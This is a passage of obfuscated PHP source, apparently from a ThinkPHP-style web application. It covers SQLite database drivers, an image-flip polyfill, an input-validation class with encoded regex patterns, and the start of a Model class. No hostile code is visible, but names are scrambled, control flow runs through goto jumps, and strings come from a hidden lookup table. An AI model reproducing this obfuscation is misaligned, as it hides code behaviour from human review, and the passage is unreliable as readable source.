if ($eë®Ì´ÙÚ[33] != $this->queryStr) { $this->error .= LNG($eë®Ì´ÙÚ[45]) . $this->queryStr; } think_trace($this->error, $eë®Ì´ÙÚ[33], $eë®Ì´ÙÚ[46]); return $this->error; } public function escapeString($F³¤÷†£œË) { return sqlite_escape_string($F³¤÷†£œË); } public function parseLimit($Aï®²ÍóÈÏ) { $FƒîÜÇ‡İ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cˆêÎƒºŸ† = $FƒîÜÇ‡İ[33]; if (!empty($Aï®²ÍóÈÏ)) { $Aï®²ÍóÈÏ = explode($FƒîÜÇ‡İ[47], $Aï®²ÍóÈÏ); if (count($Aï®²ÍóÈÏ) > 1) { $cˆêÎƒºŸ† .= $FƒîÜÇ‡İ[48] . $Aï®²ÍóÈÏ[1] . $FƒîÜÇ‡İ[49] . $Aï®²ÍóÈÏ[0] . $FƒîÜÇ‡İ[50]; } else { $cˆêÎƒºŸ† .= $FƒîÜÇ‡İ[48] . $Aï®²ÍóÈÏ[0] . $FƒîÜÇ‡İ[50]; } } return $cˆêÎƒºŸ†; } } class DbSqlite3Base extends Db { public function __construct($F»¡³Ó£´‰ = '') { $aÛƒ†³×ÆÈ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!class_exists($aÛƒ†³×ÆÈ[51])) { think_exception(think_lang($aÛƒ†³×ÆÈ[10]) . $aÛƒ†³×ÆÈ[52]); } if (!empty($F»¡³Ó£´‰)) { if (!isset($F»¡³Ó£´‰[$aÛƒ†³×ÆÈ[12]])) { $F»¡³Ó£´‰[$aÛƒ†³×ÆÈ[12]] = 438; } $this->config = $F»¡³Ó£´‰; if (empty($this->config[$aÛƒ†³×ÆÈ[13]])) { $this->config[$aÛƒ†³×ÆÈ[13]] = array(); } } } public function connect($D•‹êÛÀäø = '', $dÎ¡©–Æ¹ = 0) { $cŞ„‹ƒİô® =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!isset($this->linkID[$dÎ¡©–Æ¹])) { if (empty($D•‹êÛÀäø)) { $D•‹êÛÀäø = $this->config; } $this->linkID[$dÎ¡©–Æ¹] = new SQLite3($D•‹êÛÀäø[$cŞ„‹ƒİô®[17]]); if (!$this->linkID[$dÎ¡©–Æ¹]) { think_exception($this->linkID[$dÎ¡©–Æ¹]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$dÎ¡©–Æ¹]->busyTimeout(30000); if (1 != think_config($cŞ„‹ƒİô®[18])) { unset($this->config); } } return $this->linkID[$dÎ¡©–Æ¹]; } public function free() { $this->queryID = null; } public function query($D™ŒšÏ½ï÷) { goto B“ÂãÏ‡Óº; A‹‘ŠÒªÄ: think_status($C¼§ºÆğ¡ [20]); $this->queryID = $this->_linkID->query($D™ŒšÏ½ï÷); $this->debug(); goto b·˜¨ª’Ş¾; A†ÌÓÈ¼ƒ: $this->queryStr = $D™ŒšÏ½ï÷; if ($this->queryID) { $this->free(); } think_action_status($C¼§ºÆğ¡ [19], 1); goto A‹‘ŠÒªÄ; B“ÂãÏ‡Óº: $C¼§ºÆğ¡  =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A†ÌÓÈ¼ƒ; b·˜¨ª’Ş¾: if (!1 === $this->queryID) { $this->error(); return !1; } else { $ağà¯‡ì‹Š = $this->getAll(); $this->numRows = count($ağà¯‡ì‹Š); return $ağà¯‡ì‹Š; } goto F™¸ˆá‹‰; F™¸ˆá‹‰: } public function execute($eà»¯¥…Ÿ) { goto f¨òãÕ½‚; cØµÙ·ã: if (!1 === $fÊÊÎàè÷) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto D™…•òëõ; Aä«ó×ó–: $this->queryStr = $eà»¯¥…Ÿ; if ($this->queryID) { $this->free(); } think_action_status($DÃÃ ”ãØ[21], 1); goto eï ÜÖ‰äÄ; f¨òãÕ½‚: $DÃÃ ”ãØ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Aä«ó×ó–; eï ÜÖ‰äÄ: think_status($DÃÃ ”ãØ[20]); $fÊÊÎàè÷ = $this->_linkID->exec($eà»¯¥…Ÿ); $this->debug(); goto cØµÙ·ã; D™…•òëõ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[³‘’¼äÑ™ÔÍ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fø§Çº«¤ = $this->_linkID->query($_SERVER[³‘’¼äÑ™ÔÍ][23]); if (!$fø§Çº«¤) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $a¾‡ÉÚØÛô = $this->_linkID->query($_SERVER[³‘’¼äÑ™ÔÍ][24]); if (!$a¾‡ÉÚØÛô) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Fæ¡“›–øœ = array(); while ($Aˆ‰¦¶ç = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Fæ¡“›–øœ[] = $Aˆ‰¦¶ç; } $this->queryID->reset(); return $Fæ¡“›–øœ; } public function getFields($bŒ„İÎç) { $cÇìªÈ„†– =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e–®Ó°¿óÁ = $this->query($cÇìªÈ„†–[25] . $bŒ„İÎç . $cÇìªÈ„†–[26]); $C¤ß†Œ†˜Í = array(); if ($e–®Ó°¿óÁ) { foreach ($e–®Ó°¿óÁ as $fä‡×£ç¾ => $AÉã ñÀ»¶) { $C¤ß†Œ†˜Í[$AÉã ñÀ»¶[$cÇìªÈ„†–[28]]] = array($cÇìªÈ„†–[28] => $AÉã ñÀ»¶[$cÇìªÈ„†–[28]], $cÇìªÈ„†–[29] => $AÉã ñÀ»¶[$cÇìªÈ„†–[29]], $cÇìªÈ„†–[31] => (bool) ($AÉã ñÀ»¶[$cÇìªÈ„†–[31]] === $cÇìªÈ„†–[33]), $cÇìªÈ„†–[34] => $AÉã ñÀ»¶[$cÇìªÈ„†–[53]], $cÇìªÈ„†–[36] => (bool) $AÉã ñÀ»¶[$cÇìªÈ„†–[54]], $cÇìªÈ„†–[39] => (bool) $AÉã ñÀ»¶[$cÇìªÈ„†–[54]]); } } return $C¤ß†Œ†˜Í; } public function getTables($D‚È¤Õ›Œ = '') { $bŸ‡‚ò¡ÖŒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b¹™¼„ÒÀ¶ = $this->query($bŸ‡‚ò¡ÖŒ[42] . $bŸ‡‚ò¡ÖŒ[43] . $bŸ‡‚ò¡ÖŒ[44]); $CÍÏ´‘ñ©™ = array(); foreach ($b¹™¼„ÒÀ¶ as $bê„£ÁÇ‘Œ => $BÖ¯©ôÙ÷‚) { $CÍÏ´‘ñ©™[$bê„£ÁÇ‘Œ] = current($BÖ¯©ôÙ÷‚); } return $CÍÏ´‘ñ©™; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $A×öêŞç¿± =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->error = $this->_linkID->lastErrorMsg(); if ($A×öêŞç¿±[33] != $this->queryStr) { $this->error .= LNG($A×öêŞç¿±[45]) . $this->queryStr; } think_trace($this->error, $A×öêŞç¿±[33], $A×öêŞç¿±[46]); return $this->error; } public function escapeString($Cà½áÁ³’) { $A”óç“÷ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($this->_linkID) { return $this->_linkID->escapeString($Cà½áÁ³’); } return str_ireplace($A”óç“÷[55], $A”óç“÷[56], $Cà½áÁ³’); } public function parseLimit($A¶ÕÌÄ•¤) { $CÜ³¤…‚øØ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A‹öèÉ­Š = $CÜ³¤…‚øØ[33]; if (!empty($A¶ÕÌÄ•¤)) { $A¶ÕÌÄ•¤ = explode($CÜ³¤…‚øØ[47], $A¶ÕÌÄ•¤); if (count($A¶ÕÌÄ•¤) > 1) { $A‹öèÉ­Š .= $CÜ³¤…‚øØ[48] . $A¶ÕÌÄ•¤[1] . $CÜ³¤…‚øØ[49] . $A¶ÕÌÄ•¤[0] . $CÜ³¤…‚øØ[50]; } else { $A‹öèÉ­Š .= $CÜ³¤…‚øØ[48] . $A¶ÕÌÄ•¤[0] . $CÜ³¤…‚øØ[50]; } } return $A‹öèÉ­Š; } } goto D¦á³ÃõÍ‡; cíÏôÑŸ©‘: if (!function_exists($_SERVER[³‘’¼äÑ™ÔÍ][1880])) { define($_SERVER[³‘’¼äÑ™ÔÍ][1881], 0); define($_SERVER[³‘’¼äÑ™ÔÍ][1882], 1); define($_SERVER[³‘’¼äÑ™ÔÍ][1883], 2); function imageflip($e­¦½Øä™í, $FÛ¦‰Æä×) { switch ($FÛ¦‰Æä×) { case IMG_FLIP_HORIZONTAL: $b¹ÆºŒ¦ºÈ = imagesx($e­¦½Øä™í) - 1; $E­º›¹ëÑØ = $b¹ÆºŒ¦ºÈ / 2; $B„¼ƒ¥³¬Â = imagesy($e­¦½Øä™í); $F§êÉˆ¥âŒ = imageistruecolor($e­¦½Øä™í) ? imagecreatetruecolor(1, $B„¼ƒ¥³¬Â) : imagecreate(1, $B„¼ƒ¥³¬Â); for ($DÑŠ£ó×ğŠ = 0; $DÑŠ£ó×ğŠ < $E­º›¹ëÑØ; ++$DÑŠ£ó×ğŠ) { imagecopy($F§êÉˆ¥âŒ, $e­¦½Øä™í, 0, 0, $DÑŠ£ó×ğŠ, 0, 1, $B„¼ƒ¥³¬Â); imagecopy($e­¦½Øä™í, $e­¦½Øä™í, $DÑŠ£ó×ğŠ, 0, $b¹ÆºŒ¦ºÈ - $DÑŠ£ó×ğŠ, 0, 1, $B„¼ƒ¥³¬Â); imagecopy($e­¦½Øä™í, $F§êÉˆ¥âŒ, $b¹ÆºŒ¦ºÈ - $DÑŠ£ó×ğŠ, 0, 0, 0, 1, $B„¼ƒ¥³¬Â); } break; case IMG_FLIP_VERTICAL: $AêÆ·ŒìŞÃ = imagesx($e­¦½Øä™í); $eÃÁãÔ®ì = imagesy($e­¦½Øä™í) - 1; $A¶«¡àìÑ´ = $eÃÁãÔ®ì / 2; $F§êÉˆ¥âŒ = imageistruecolor($e­¦½Øä™í) ? imagecreatetruecolor($AêÆ·ŒìŞÃ, 1) : imagecreate($AêÆ·ŒìŞÃ, 1); for ($CÛÈÌ†Ôİ = 0; $CÛÈÌ†Ôİ < $A¶«¡àìÑ´; ++$CÛÈÌ†Ôİ) { imagecopy($F§êÉˆ¥âŒ, $e­¦½Øä™í, 0, 0, 0, $CÛÈÌ†Ôİ, $AêÆ·ŒìŞÃ, 1); imagecopy($e­¦½Øä™í, $e­¦½Øä™í, 0, $CÛÈÌ†Ôİ, 0, $eÃÁãÔ®ì - $CÛÈÌ†Ôİ, $AêÆ·ŒìŞÃ, 1); imagecopy($e­¦½Øä™í, $F§êÉˆ¥âŒ, 0, $eÃÁãÔ®ì - $CÛÈÌ†Ôİ, 0, 0, $AêÆ·ŒìŞÃ, 1); } break; case IMG_FLIP_BOTH: $AêÆ·ŒìŞÃ = imagesx($e­¦½Øä™í); $B„¼ƒ¥³¬Â = imagesy($e­¦½Øä™í); $F§êÉˆ¥âŒ = imagerotate($e­¦½Øä™í, 180, 0); imagecopy($e­¦½Øä™í, $F§êÉˆ¥âŒ, 0, 0, 0, 0, $AêÆ·ŒìŞÃ, $B„¼ƒ¥³¬Â); break; default: return; } imagedestroy($F§êÉˆ¥âŒ); } } if (!function_exists($_SERVER[³‘’¼äÑ™ÔÍ][1884])) { function imagecreatefrombmp($bëõöŞ¨Öª) { return ImageGdBMP::load($bëõöŞ¨Öª); } } class Input { public static function getArray($AÒ“„‡©‘) { goto dâ¥Ç‡ä‰‹; eÑ Í‘‘áƒ: $C«Ñ¾ºŒÜÚ = array(); $Bº£îß¥×Ÿ = LNG($A†æïÕ…Ã[1885]); foreach ($AÒ“„‡©‘ as $e²„Ñ˜ö Š => $f¯¯Û†Öö) { goto bÌŠ–×ª§Ô; b›¾Ç™Õß: if (isset($f¯¯Û†Öö[$A†æïÕ…Ã[1888]]) && !self::check($in[$e²„Ñ˜ö Š], $f¯¯Û†Öö[$A†æïÕ…Ã[1888]], $C•º‘ë±’ñ)) { if (array_key_exists($A†æïÕ…Ã[1887], $f¯¯Û†Öö)) { if (!is_null($f¯¯Û†Öö[$A†æïÕ…Ã[1887]])) { $e§´‘Í…ÔŠ[$EÒÖ»®†‘›] = $f¯¯Û†Öö[$A†æïÕ…Ã[1887]]; } } else { $C«Ñ¾ºŒÜÚ[] = $a›Ç³ë®¨ğ; } continue; } $e§´‘Í…ÔŠ[$EÒÖ»®†‘›] = $in[$e²„Ñ˜ö Š]; goto c„Ò”ßÅß; D›øÚ­ãåˆ: if (!array_key_exists($e²„Ñ˜ö Š, $in)) { if (array_key_exists($A†æïÕ…Ã[1887], $f¯¯Û†Öö)) { if (!is_null($f¯¯Û†Öö[$A†æïÕ…Ã[1887]])) { $e§´‘Í…ÔŠ[$EÒÖ»®†‘›] = $f¯¯Û†Öö[$A†æïÕ…Ã[1887]]; } } else { if (isset($f¯¯Û†Öö[$A†æïÕ…Ã[1888]])) { $C«Ñ¾ºŒÜÚ[] = $a›Ç³ë®¨ğ; } } continue; } if (isset($f¯¯Û†Öö[$A†æïÕ…Ã[1888]]) && $f¯¯Û†Öö[$A†æïÕ…Ã[1888]] == $A†æïÕ…Ã[282]) { $fŸÓƒ«£ = json_decode($in[$e²„Ñ˜ö Š], !0); if (is_array($fŸÓƒ«£)) { $e§´‘Í…ÔŠ[$EÒÖ»®†‘›] = $fŸÓƒ«£; } else { if (array_key_exists($A†æïÕ…Ã[1887], $f¯¯Û†Öö)) { if (!is_null($f¯¯Û†Öö[$A†æïÕ…Ã[1887]])) { $e§´‘Í…ÔŠ[$EÒÖ»®†‘›] = $f¯¯Û†Öö[$A†æïÕ…Ã[1887]]; } } else { $C«Ñ¾ºŒÜÚ[] = $a›Ç³ë®¨ğ; } } continue; } $C•º‘ë±’ñ = _get($f¯¯Û†Öö, $A†æïÕ…Ã[1016]); goto b›¾Ç™Õß; bÌŠ–×ª§Ô: $a›Ç³ë®¨ğ = _get($f¯¯Û†Öö, $A†æïÕ…Ã[1252], $Bº£îß¥×Ÿ . $A†æïÕ…Ã[884] . $e²„Ñ˜ö Š); $EÒÖ»®†‘› = $e²„Ñ˜ö Š; if (isset($f¯¯Û†Öö[$A†æïÕ…Ã[1886]]) && $f¯¯Û†Öö[$A†æïÕ…Ã[1886]]) { $EÒÖ»®†‘› = $f¯¯Û†Öö[$A†æïÕ…Ã[1886]]; } goto D›øÚ­ãåˆ; c„Ò”ßÅß: } goto båÍä…«¦å; dâ¥Ç‡ä‰‹: $A†æïÕ…Ã =& $_SERVER[³‘’¼äÑ™ÔÍ]; global $in; $e§´‘Í…ÔŠ = array(); goto eÑ Í‘‘áƒ; båÍä…«¦å: if (count($C«Ñ¾ºŒÜÚ) > 0) { show_json(implode($A†æïÕ…Ã[1889], $C«Ñ¾ºŒÜÚ), !1); } return $e§´‘Í…ÔŠ; goto DÙ¾Ò«øÖ; DÙ¾Ò«øÖ: } public static function reg($d‹¯»¸Ù±© = "\x72\x65\161\165\151\162\x65") { static $fÏÊÁñ½Ö = array("\162\145\x71\165\x69\x72\x65" => "\x2e\x2b", "\x6e\165\155\142\x65\162" => "\134\144\x2b", "\x68\x65\170" => "\133\60\x2d\x39\x41\x2d\106\x61\55\146\135\x2b", "\151\156\x74" => "\x5b\55\x5c\x2b\135\77\134\144\x2b", "\142\x6f\157\154" => "\60\x7c\x31", "\146\154\157\x61\x74" => "\133\x2d\x5c\53\135\77\134\144\53\x28\x5c\56\134\x64\53\51\77", "\145\x6e\x67\x6c\151\163\150" => "\x5b\x41\x2d\132\141\55\172\40\135\53", "\x63\x68\x69\156\x65\x73\x65" => "\133\x5c\x78\173\64\145\60\x30\175\55\134\x78\x7b\x39\146\x61\x35\x7d\x5d\53", "\150\x61\163\103\x68\151\156\x65\163\145" => "\57\50\x5b\x5c\x78\x7b\64\145\x30\x30\x7d\55\134\170\x7b\x39\x66\141\x35\175\135\53\51\x2f\x75", "\x65\x6d\x61\x69\154" => "\134\x77\x2b\x28\x5b\x5c\56\134\x2d\135\134\x77\53\x29\52\134\x40\x5c\x77\53\50\x5b\x5c\x2e\134\x2d\135\134\x77\53\51\52\x5c\x2e\x5c\x77\x2b", "\160\x68\157\156\145" => "\x31\x5b\x33\x2d\71\x5d\134\x64\173\x39\x7d", "\164\x65\x6c\x70\x68\157\x6e\x65" => "\50\x5c\50\x5c\x64\x7b\63\54\x34\175\134\x29\174\134\x64\173\x33\x2c\64\x7d\55\174\x5c\x73\51\x3f\x5c\x64\x7b\x37\54\61\x34\x7d", "\165\x72\154" => "\x28\x68\164\x74\160\x7c\146\164\x70\174\x68\164\164\x70\x73\51\x3a\134\57\x5c\57\133\x5c\x77\134\x2d\x5f\x5d\53\50\x5c\x2e\x5b\134\x77\134\55\x5f\x5d\x2b\x29\x2b\50\133\134\167\134\55\x5c\56\54\100\x3f\x5e\75\45\x26\72\134\x2f\x7e\x5c\53\x23\135\x2a\133\x5c\167\134\x2d\134\x40\x3f\136\75\x25\x26\134\57\176\x5c\53\43\x5d\51\77", "\x75\162\154\x46\x75\x6c\x6c" => "\133\141\x2d\172\x41\x2d\x7a\135\53\72\134\57\x5c\57\x5b\136\134\163\x5d\x2a", "\151\160" => "\x28\x5c\144\x7b\61\54\x33\175\134\56\51\173\x33\x7d\50\x5c\144\173\61\x2c\x33\175\x29", "\x7a\151\160" => "\x5b\x31\x2d\x39\x5d\x5c\144\x7b\x35\x7d\50\x3f\x21\134\x64\51", "\151\144\x43\x61\x72\144" => "\50\x5c\144\173\61\65\175\x29\x7c\50\x5c\x64\x7b\x31\67\175\x28\x5c\x64\174\130\174\x78\51\51", "\143\x6f\154\157\162" => "\43\50\x5b\x30\x2d\71\x41\55\x46\141\55\x66\x5d\x7b\63\175\x7c\133\60\55\x39\101\x2d\x46\x61\x2d\146\135\x7b\x36\175\51", "\164\151\155\x65" => "\x28\133\x30\55\x31\135\134\144\174\62\133\x30\55\64\x5d\x29\x3a\133\x30\55\x35\135\134\144", "\144\141\164\145" => "\134\144\173\64\x7d\x5b\x2d\x5c\x2f\135\77\50\x30\x5b\x31\x2d\x39\x5d\174\61\133\x30\55\62\x5d\51\x5b\x2d\134\x2f\135\x3f\50\133\60\55\62\135\x5c\144\x7c\63\x5b\x30\55\x31\x5d\x29", "\x64\141\164\145\x54\x69\x6d\145" => "\x5c\144\x7b\x34\175\133\55\134\x2f\135\77\50\x30\x5b\61\x2d\71\x5d\x7c\x31\133\x30\x2d\62\x5d\51\133\55\134\57\135\77\x28\x5b\x30\55\x32\135\x5c\x64\x7c\63\133\x30\x2d\61\135\51\134\163\x2b\x28\133\x30\x2d\x31\135\134\x64\174\x32\x5b\60\x2d\x34\135\51\72\x5b\x30\55\x35\135\134\x64", "\x70\141\163\x73\x77\x6f\x72\x64" => "\x28\x3f\x3d\x2e\52\x5c\144\51\x28\77\x3d\56\x2a\x5b\x61\55\x7a\135\51\50\x3f\x3d\x2e\52\x5b\101\x2d\x5a\x5d\51\x2e\173\70\x2c\x32\x30\175", "\x6b\x65\x79" => "\x5b\x41\x2d\x5a\x61\55\x7a\x30\x2d\71\x5f\134\55\134\56\x5d\x2b", "\153\x65\171\106\x75\154\x6c" => "\x5b\101\55\132\x61\55\172\x30\55\71\137\x5c\x2d\134\x2e\x5c\x73\54\x5d\53"); if (!$d‹¯»¸Ù±©) { return $fÏÊÁñ½Ö; } return $fÏÊÁñ½Ö[$d‹¯»¸Ù±©]; } public static function check($EçŸ«¥ËÖ½, $f¶Æ˜™¡ôŞ, $B ²×ğëæ† = null) { $EëßŸİÙŞØ =& $_SERVER[³‘’¼äÑ™ÔÍ]; switch ($f¶Æ˜™¡ôŞ) { case $EëßŸİÙŞØ[7]: return in_array($EçŸ«¥ËÖ½, $B ²×ğëæ†); break; case $EëßŸİÙŞØ[1890]: return floatval($EçŸ«¥ËÖ½) > $B ²×ğëæ†; break; case $EëßŸİÙŞØ[1891]: return floatval($EçŸ«¥ËÖ½) < $B ²×ğëæ†; break; case $EëßŸİÙŞØ[325]: return strlen($EçŸ«¥ËÖ½) >= $B ²×ğëæ†[0] && strlen($EçŸ«¥ËÖ½) <= $B ²×ğëæ†[1]; break; case $EëßŸİÙŞØ[325]: if (is_array($B ²×ğëæ†)) { return strlen($EçŸ«¥ËÖ½) >= $B ²×ğëæ†[0] && strlen($EçŸ«¥ËÖ½) <= $B ²×ğëæ†[1]; break; } else { return strlen($EçŸ«¥ËÖ½) == $B ²×ğëæ†; break; } case $EëßŸİÙŞØ[321]: return floatval($EçŸ«¥ËÖ½) >= $B ²×ğëæ†[0] && floatval($EçŸ«¥ËÖ½) <= $B ²×ğëæ†[1]; break; } $DƒµÕ¼“„í = self::reg(!1); $f¶Æ˜™¡ôŞ = isset($DƒµÕ¼“„í[$f¶Æ˜™¡ôŞ]) ? $DƒµÕ¼“„í[$f¶Æ˜™¡ôŞ] : $f¶Æ˜™¡ôŞ; if (substr($f¶Æ˜™¡ôŞ, 0, 1) != $EëßŸİÙŞØ[8]) { $f¶Æ˜™¡ôŞ = $EëßŸİÙŞØ[1892] . $f¶Æ˜™¡ôŞ . $EëßŸİÙŞØ[1893]; } return preg_match($f¶Æ˜™¡ôŞ, $EçŸ«¥ËÖ½) === 1; } public static function get($FõÖì®Í„Ú, $EéÍ¶ÀÀ‹‚ = null, $bØòŠ¸’º = null, $eÔ„™íå = null) { goto aŒóç •„Š; b‹¡ğŞ÷Åó: if (!is_null($eÔ„™íå)) { $C™™Ã‚ì®[$B¼È©ÔÄ…[1016]] = $eÔ„™íå; } if (!is_null($EéÍ¶ÀÀ‹‚)) { $C™™Ã‚ì®[$B¼È©ÔÄ…[1888]] = $EéÍ¶ÀÀ‹‚; } $bßİÖ½–Ê¢ = Input::getArray(array($FõÖì®Í„Ú => $C™™Ã‚ì®)); goto bôŠ£«…ì¸; bôŠ£«…ì¸: return $bßİÖ½–Ê¢[$FõÖì®Í„Ú]; goto CšóÑÖ®…™; aŒóç •„Š: $B¼È©ÔÄ… =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C™™Ã‚ì® = array(); if (!is_null($bØòŠ¸’º)) { $C™™Ã‚ì®[$B¼È©ÔÄ…[34]] = $bØòŠ¸’º; } goto b‹¡ğŞ÷Åó; CšóÑÖ®…™: } } goto F³©Õ÷©Ù¼; fİ·¯æˆøƒ: define($_SERVER[³‘’¼äÑ™ÔÍ][230], 0); define($_SERVER[³‘’¼äÑ™ÔÍ][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\x65", "\157\x72\144\145\162", "\x61\154\x69\141\x73", "\150\141\166\151\156\147", "\147\x72\157\165\160", "\x6c\157\x63\x6b", "\x64\151\x73\x74\151\x6e\x63\164", "\x61\165\164\x6f", "\146\x69\x6c\x74\x65\162", "\166\x61\154\x69\x64\x61\x74\145", "\x72\145\x73\x75\x6c\x74", "\142\x69\x6e\144", "\x74\157\x6b\x65\156"); public function __construct($Eµå…Øºƒá = '', $F¹ŒôÄ¿ = '', $B†¤Ş‚‘ = '') { $F¡‡ªîáâÂ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->_initialize(); if (!empty($Eµå…Øºƒá)) { if (strpos($Eµå…Øºƒá, $F¡‡ªîáâÂ[91])) { list($this->dbName, $this->name) = explode($F¡‡ªîáâÂ[91], $Eµå…Øºƒá); } else { $this->name = $Eµå…Øºƒá; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($F¹ŒôÄ¿)) { $this->tablePrefix = $F¡‡ªîáâÂ[33]; } elseif ($F¡‡ªîáâÂ[33] != $F¹ŒôÄ¿) { $this->tablePrefix = $F¹ŒôÄ¿; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($F¡‡ªîáâÂ[232]); } $this->db(0, empty($this->connection) ? $B†¤Ş‚‘ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $f´—½ëíŞ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($this->fields)) { if (think_config($f´—½ëíŞ[233])) { $F´Ö“Îóœ® = $this->dbName ? $this->dbName : think_config($f´—½ëíŞ[234]); $c‚±„‡ä = think_var_cache($f´—½ëíŞ[235] . strtolower(get_path_this($F´Ö“Îóœ®) . $f´—½ëíŞ[91] . $this->name)); if ($c‚±„‡ä) { $E‘…»­«Ì = think_config($f´—½ëíŞ[236]); if (empty($E‘…»­«Ì) || $c‚±„‡ä[$f´—½ëíŞ[237]] == $E‘…»­«Ì) { $this->fields = $c‚±„‡ä; return; } } } $this->flush(); } } public function flush() { goto bĞíù©å‡; bĞíù©å‡: $f‹îíç¢í =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->db->setModel($this->name); $dˆº·ç´£‡ = $this->db->getFields($this->getTableName()); goto bÕÕÑöÏá˜; c£šÍ´–áí: foreach ($dˆº·ç´£‡ as $f¨ëñ¨ŒòÑ => $A‹éøõº‰·) { $eÇš‡ÑñÚÎ[$f¨ëñ¨ŒòÑ] = $A‹éøõº‰·[$f‹îíç¢í[29]]; if ($A‹éøõº‰·[$f‹îíç¢í[36]]) { $this->fields[$f‹îíç¢í[239]] = $f¨ëñ¨ŒòÑ; if ($A‹éøõº‰·[$f‹îíç¢í[39]]) { $this->fields[$f‹îíç¢í[238]] = !0; } } } $this->fields[$f‹îíç¢í[240]] = $eÇš‡ÑñÚÎ; if (think_config($f‹îíç¢í[236])) { $this->fields[$f‹îíç¢í[237]] = think_config($f‹îíç¢í[236]); } goto A†µŒ¸­öâ; bÕÕÑöÏá˜: if (!$dˆº·ç´£‡) { return !1; } $this->fields = array_keys($dˆº·ç´£‡); $this->fields[$f‹îíç¢í[238]] = !1; goto c£šÍ´–áí; A†µŒ¸­öâ: if (think_config($f‹îíç¢í[233])) { $FĞÏ¢È‘áˆ = $this->dbName ? $this->dbName : think_config($f‹îíç¢í[234]); think_var_cache($f‹îíç¢í[235] . strtolower(get_path_this($FĞÏ¢È‘áˆ) . $f‹îíç¢í[91] . $this->name), $this->fields); } goto b‡ä’¯İç¸; b‡ä’¯İç¸: } public function switchModel($AÑ÷È¨§®‡, $fØÔ†÷”²î = array()) { $fĞÎßÑÔ… =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d¹ñÊ–ğ„ = ucwords(strtolower($AÑ÷È¨§®‡)) . $fĞÎßÑÔ…[241]; if (!class_exists($d¹ñÊ–ğ„)) { think_exception($d¹ñÊ–ğ„ . think_lang($fĞÎßÑÔ…[242])); } $this->_extModel = new $d¹ñÊ–ğ„($this->name); if (!empty($fØÔ†÷”²î)) { foreach ($fØÔ†÷”²î as $cÓÒé…×Ï•) { $this->_extModel->setProperty($cÓÒé…×Ï•, $this->{$cÓÒé…×Ï•}); } } return $this->_extModel; } public function __set($fÓ¨ÂÇ­ó, $a¨šùèƒäõ) { $this->data[$fÓ¨ÂÇ­ó] = $a¨šùèƒäõ; } public function __get($E­µ­œ•°) { return isset($this->data[$E­µ­œ•°]) ? $this->data[$E­µ­œ•°] : null; } public function __isset($BºÉó™Ã’Ş) { return isset($this->data[$BºÉó™Ã’Ş]); } public function __unset($c·‰¦°ºÛ”) { unset($this->data[$c·‰¦°ºÛ”]); } public function __call($Dªî´ªÆè, $aÄíÌ¨”ºå) { $Câ¸´É”¯´ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (in_array(strtolower($Dªî´ªÆè), $this->methods, !0)) { $this->options[strtolower($Dªî´ªÆè)] = $aÄíÌ¨”ºå[0]; return $this; } elseif (in_array(strtolower($Dªî´ªÆè), array($Câ¸´É”¯´[243], $Câ¸´É”¯´[244], $Câ¸´É”¯´[245], $Câ¸´É”¯´[246], $Câ¸´É”¯´[247]), !0)) { $E„Í»ŠÌø = isset($aÄíÌ¨”ºå[0]) ? $aÄíÌ¨”ºå[0] : $Câ¸´É”¯´[176]; $E„Í»ŠÌø = $this->db->parseKey($E„Í»ŠÌø); return $this->getField(strtoupper($Dªî´ªÆè) . $Câ¸´É”¯´[248] . $E„Í»ŠÌø . $Câ¸´É”¯´[249] . $Dªî´ªÆè, $Câ¸´É”¯´[243]); } elseif (strtolower(substr($Dªî´ªÆè, 0, 5)) == $Câ¸´É”¯´[250]) { $E„Í»ŠÌø = think_parse_name(substr($Dªî´ªÆè, 5)); $eªµŞä¡Ï¥[$E„Í»ŠÌø] = $aÄíÌ¨”ºå[0]; return $this->where($eªµŞä¡Ï¥)->find(); } elseif (strtolower(substr($Dªî´ªÆè, 0, 10)) == $Câ¸´É”¯´[251]) { $CŞ êƒ—™ï = think_parse_name(substr($Dªî´ªÆè, 10)); $eªµŞä¡Ï¥[$CŞ êƒ—™ï] = $aÄíÌ¨”ºå[0]; return $this->where($eªµŞä¡Ï¥)->getField($aÄíÌ¨”ºå[1]); } elseif (isset($this->_scope[$Dªî´ªÆè])) { return $this->scope($Dªî´ªÆè, $aÄíÌ¨”ºå[0]); } elseif (method_exists($this, $Dªî´ªÆè)) { 